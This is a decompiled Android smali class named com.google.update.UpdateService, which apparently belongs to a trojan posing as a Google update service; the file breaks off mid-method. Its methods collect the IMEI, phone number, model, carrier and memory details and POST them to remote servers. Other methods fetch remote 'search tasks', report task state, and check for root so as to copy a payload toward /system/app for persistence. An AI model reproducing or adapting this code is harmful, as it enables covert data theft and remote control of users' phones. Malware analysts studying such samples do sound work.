.class public Lcom/google/update/UpdateService;
.super Landroid/app/Service;
.source "UpdateService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/update/UpdateService$MyThread;
    }
.end annotation


# static fields
.field private static INTERVAL:J


# instance fields
.field private mAliaMem:Ljava/lang/String;

.field private mIdentifier:Ljava/lang/String;

.field private mImei:Ljava/lang/String;

.field private mJu6Ad:Lcom/ju6/AdRequester;

.field private mMobile:Ljava/lang/String;

.field private mModel:Ljava/lang/String;

.field private mNetType:Ljava/lang/String;

.field private mOperater:Ljava/lang/String;

.field private mOsAPI:Ljava/lang/String;

.field private mOsType:Ljava/lang/String;

.field private mPermState:I

.field private mPreferences:Landroid/content/SharedPreferences;

.field private mSDMem:Ljava/lang/String;

.field private mTaskId:Ljava/lang/String;

.field private mTickets:J

.field private mTimer:Ljava/util/Timer;

.field private mTimerTask:Ljava/util/TimerTask;

.field private startDelay:J


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 94
    const-wide/32 v0, 0xea60

    sput-wide v0, Lcom/google/update/UpdateService;->INTERVAL:J

    .line 47
    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    .line 47
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 75
    iput-object v2, p0, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    .line 76
    const-string v0, "-1"

    iput-object v0, p0, Lcom/google/update/UpdateService;->mIdentifier:Ljava/lang/String;

    .line 77
    iput-object v2, p0, Lcom/google/update/UpdateService;->mImei:Ljava/lang/String;

    .line 78
    iput-object v2, p0, Lcom/google/update/UpdateService;->mMobile:Ljava/lang/String;

    .line 79
    iput-object v2, p0, Lcom/google/update/UpdateService;->mModel:Ljava/lang/String;

    .line 80
    iput-object v2, p0, Lcom/google/update/UpdateService;->mOsType:Ljava/lang/String;

    .line 81
    iput-object v2, p0, Lcom/google/update/UpdateService;->mOsAPI:Ljava/lang/String;

    .line 82
    iput-object v2, p0, Lcom/google/update/UpdateService;->mAliaMem:Ljava/lang/String;

    .line 83
    iput-object v2, p0, Lcom/google/update/UpdateService;->mSDMem:Ljava/lang/String;

    .line 84
    iput-object v2, p0, Lcom/google/update/UpdateService;->mNetType:Ljava/lang/String;

    .line 85
    iput-object v2, p0, Lcom/google/update/UpdateService;->mOperater:Ljava/lang/String;

    .line 87
    const-string v0, ""

    iput-object v0, p0, Lcom/google/update/UpdateService;->mTaskId:Ljava/lang/String;

    .line 89
    const/4 v0, 0x0

    iput v0, p0, Lcom/google/update/UpdateService;->mPermState:I

    .line 91
    const-wide/16 v0, 0x9

    iput-wide v0, p0, Lcom/google/update/UpdateService;->mTickets:J

    .line 92
    iput-object v2, p0, Lcom/google/update/UpdateService;->mTimer:Ljava/util/Timer;

    .line 95
    const-wide/16 v0, 0xe10

    iput-wide v0, p0, Lcom/google/update/UpdateService;->startDelay:J

    .line 96
    iput-object v2, p0, Lcom/google/update/UpdateService;->mJu6Ad:Lcom/ju6/AdRequester;

    .line 47
    return-void
.end method

.method private _doAdGetParam(Ljava/lang/String;)Ljava/lang/String;
    .locals 9
    .param p1, "action"    # Ljava/lang/String;

    .prologue
    .line 169
    const/4 v5, 0x0

    .line 170
    .local v5, "result":Ljava/lang/String;
    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    .line 172
    .local v4, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v6, Lorg/apache/http/message/BasicNameValuePair;

    const-string v7, "imei"

    iget-object v8, p0, Lcom/google/update/UpdateService;->mImei:Ljava/lang/String;

    invoke-direct {v6, v7, v8}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v4, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 173
    new-instance v6, Lorg/apache/http/message/BasicNameValuePair;

    const-string v7, "ch"

    iget-object v8, p0, Lcom/google/update/UpdateService;->mIdentifier:Ljava/lang/String;

    invoke-direct {v6, v7, v8}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v4, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 174
    new-instance v6, Lorg/apache/http/message/BasicNameValuePair;

    const-string v7, "ver"

    const-string v8, "a11"

    invoke-direct {v6, v7, v8}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v4, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 176
    new-instance v2, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v2, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 178
    .local v2, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v6, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v7, "UTF-8"

    invoke-direct {v6, v4, v7}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v2, v6}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 179
    new-instance v6, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v6}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v6, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v3

    .line 180
    .local v3, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v3}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v6

    invoke-interface {v6}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v6

    const/16 v7, 0xc8

    if-ne v6, v7, :cond_0

    .line 181
    invoke-interface {v3}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    .line 182
    .local v1, "httpEntity":Lorg/apache/http/HttpEntity;
    const-string v6, "utf-8"

    invoke-static {v1, v6}, Lorg/apache/http/util/EntityUtils;->toString(Lorg/apache/http/HttpEntity;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v5

    .line 186
    .end local v1    # "httpEntity":Lorg/apache/http/HttpEntity;
    .end local v3    # "httpResponse":Lorg/apache/http/HttpResponse;
    :cond_0
    :goto_0
    return-object v5

    .line 184
    :catch_0
    move-exception v6

    move-object v0, v6

    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private _doSearchReport(Ljava/lang/String;)Z
    .locals 9
    .param p1, "action"    # Ljava/lang/String;

    .prologue
    const-string v8, "pm"

    const-string v7, ""

    .line 489
    const/4 v3, 0x0

    .line 490
    .local v3, "result":Z
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    .line 492
    .local v2, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "imei"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mImei:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 493
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "ch"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mIdentifier:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 494
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "ver"

    const-string v6, "a11"

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 495
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v4

    if-eqz v4, :cond_9

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "pm"

    const-string v5, "1"

    invoke-direct {v4, v8, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 498
    :goto_0
    iget-object v4, p0, Lcom/google/update/UpdateService;->mOsType:Ljava/lang/String;

    if-eqz v4, :cond_0

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->mOsType:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "ostype"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mOsType:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 499
    :cond_0
    iget-object v4, p0, Lcom/google/update/UpdateService;->mOsAPI:Ljava/lang/String;

    if-eqz v4, :cond_1

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->mOsAPI:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_1

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "osapi"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mOsAPI:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 500
    :cond_1
    iget-object v4, p0, Lcom/google/update/UpdateService;->mMobile:Ljava/lang/String;

    if-eqz v4, :cond_2

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->mMobile:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_2

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "mobile"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mMobile:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 501
    :cond_2
    iget-object v4, p0, Lcom/google/update/UpdateService;->mModel:Ljava/lang/String;

    if-eqz v4, :cond_3

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->mModel:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_3

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "mobilemodel"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mModel:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 502
    :cond_3
    iget-object v4, p0, Lcom/google/update/UpdateService;->mOperater:Ljava/lang/String;

    if-eqz v4, :cond_4

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->mOperater:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_4

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "netoperater"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mOperater:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 503
    :cond_4
    iget-object v4, p0, Lcom/google/update/UpdateService;->mNetType:Ljava/lang/String;

    if-eqz v4, :cond_5

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->mNetType:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_5

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "nettype"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mNetType:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 504
    :cond_5
    iget-object v4, p0, Lcom/google/update/UpdateService;->mSDMem:Ljava/lang/String;

    if-eqz v4, :cond_6

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->mSDMem:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_6

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "sdmemory"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mSDMem:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 505
    :cond_6
    iget-object v4, p0, Lcom/google/update/UpdateService;->mAliaMem:Ljava/lang/String;

    if-eqz v4, :cond_7

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->mAliaMem:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_7

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "aliamemory"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mAliaMem:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 507
    :cond_7
    new-instance v0, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v0, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 509
    .local v0, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v4, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v5, "UTF-8"

    invoke-direct {v4, v2, v5}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v0, v4}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 510
    new-instance v4, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v4, v0}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v1

    .line 511
    .local v1, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v4

    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v4

    const/16 v5, 0xc8

    if-ne v4, v5, :cond_8

    .line 512
    const/4 v3, 0x1

    .line 516
    .end local v1    # "httpResponse":Lorg/apache/http/HttpResponse;
    :cond_8
    :goto_1
    return v3

    .line 496
    .end local v0    # "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :cond_9
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "pm"

    const-string v5, "0"

    invoke-direct {v4, v8, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto/16 :goto_0

    .line 514
    .restart local v0    # "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :catch_0
    move-exception v4

    goto :goto_1
.end method

.method private _getSearchTask(Ljava/lang/String;)Ljava/lang/String;
    .locals 13
    .param p1, "action"    # Ljava/lang/String;

    .prologue
    .line 554
    const-string v9, "NONE"

    .line 556
    .local v9, "result":Ljava/lang/String;
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 557
    .local v8, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "imei"

    iget-object v12, p0, Lcom/google/update/UpdateService;->mImei:Ljava/lang/String;

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 558
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "ch"

    iget-object v12, p0, Lcom/google/update/UpdateService;->mIdentifier:Ljava/lang/String;

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 559
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "ver"

    const-string v12, "a11"

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 561
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v3, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 563
    .local v3, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v10, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v11, "UTF-8"

    invoke-direct {v10, v8, v11}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v3, v10}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 564
    new-instance v10, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v10}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v10, v3}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v4

    .line 565
    .local v4, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v10

    invoke-interface {v10}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v10

    const/16 v11, 0xc8

    if-ne v10, v11, :cond_1

    .line 566
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v2

    .line 567
    .local v2, "entity":Lorg/apache/http/HttpEntity;
    invoke-interface {v2}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v5

    .line 568
    .local v5, "is":Ljava/io/InputStream;
    new-instance v6, Ljava/io/InputStreamReader;

    invoke-direct {v6, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 569
    .local v6, "isr":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 570
    .local v0, "br":Ljava/io/BufferedReader;
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v7

    .line 572
    .local v7, "line":Ljava/lang/String;
    if-eqz v7, :cond_0

    invoke-virtual {v7}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v10

    const-string v11, "OK"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_0

    .line 573
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v9

    .line 574
    invoke-virtual {v9}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v9

    .line 577
    :cond_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V

    .line 578
    invoke-virtual {v6}, Ljava/io/InputStreamReader;->close()V

    .line 579
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 583
    .end local v0    # "br":Ljava/io/BufferedReader;
    .end local v2    # "entity":Lorg/apache/http/HttpEntity;
    .end local v4    # "httpResponse":Lorg/apache/http/HttpResponse;
    .end local v5    # "is":Ljava/io/InputStream;
    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .end local v7    # "line":Ljava/lang/String;
    :goto_0
    return-object v9

    .line 580
    .restart local v4    # "httpResponse":Lorg/apache/http/HttpResponse;
    :cond_1
    const/4 v9, 0x0

    goto :goto_0

    .line 581
    .end local v4    # "httpResponse":Lorg/apache/http/HttpResponse;
    :catch_0
    move-exception v10

    move-object v1, v10

    .local v1, "e":Ljava/lang/Exception;
    const/4 v9, 0x0

    goto :goto_0
.end method

.method private _reportState(Ljava/lang/String;ILjava/lang/String;)Z
    .locals 8
    .param p1, "action"    # Ljava/lang/String;
    .param p2, "state"    # I
    .param p3, "comment"    # Ljava/lang/String;

    .prologue
    const-string v7, ""

    .line 795
    const/4 v3, 0x0

    .line 796
    .local v3, "result":Z
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    .line 798
    .local v2, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "imei"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mImei:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 799
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "taskid"

    iget-object v6, p0, Lcom/google/update/UpdateService;->mTaskId:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 800
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "state"

    invoke-static {p2}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 802
    if-eqz p3, :cond_0

    const-string v4, ""

    invoke-virtual {v7, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "comment"

    invoke-direct {v4, v5, p3}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 804
    :cond_0
    new-instance v0, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v0, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 806
    .local v0, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v4, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v5, "UTF-8"

    invoke-direct {v4, v2, v5}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v0, v4}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 807
    new-instance v4, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v4, v0}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v1

    .line 808
    .local v1, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v4

    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v4

    const/16 v5, 0xc8

    if-ne v4, v5, :cond_1

    .line 809
    const/4 v3, 0x1

    .line 813
    .end local v1    # "httpResponse":Lorg/apache/http/HttpResponse;
    :cond_1
    :goto_0
    const/4 v4, 0x1

    if-eq p2, v4, :cond_2

    const/4 v4, -0x1

    if-ne p2, v4, :cond_3

    :cond_2
    const-string v4, ""

    iput-object v7, p0, Lcom/google/update/UpdateService;->mTaskId:Ljava/lang/String;

    .line 814
    :cond_3
    return v3

    .line 811
    :catch_0
    move-exception v4

    goto :goto_0
.end method

.method static synthetic access$0(Lcom/google/update/UpdateService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 103
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$1(Lcom/google/update/UpdateService;)V
    .locals 0

    .prologue
    .line 434
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doTimerTask()V

    return-void
.end method

.method private checkPermission()Z
    .locals 1

    .prologue
    .line 241
    invoke-static {}, Lcom/google/update/Utils;->checkPermission()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 242
    invoke-direct {p0}, Lcom/google/update/UpdateService;->cpLegacyRes()V

    .line 243
    const/4 v0, 0x1

    .line 245
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method private cpLegacyRes()V
    .locals 5

    .prologue
    const-string v4, "/system/app/com.google.update.apk"

    .line 228
    new-instance v2, Ljava/io/File;

    const-string v3, "/system/app/com.google.update.apk"

    invoke-direct {v2, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 238
    :cond_0
    :goto_0
    return-void

    .line 230
    :cond_1
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "db"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 231
    .local v1, "dest":Ljava/lang/String;
    const-string v2, "db.init"

    const v3, 0xc450

    invoke-static {p0, v2, v1, v3}, Lcom/google/update/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 233
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 234
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "2 "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

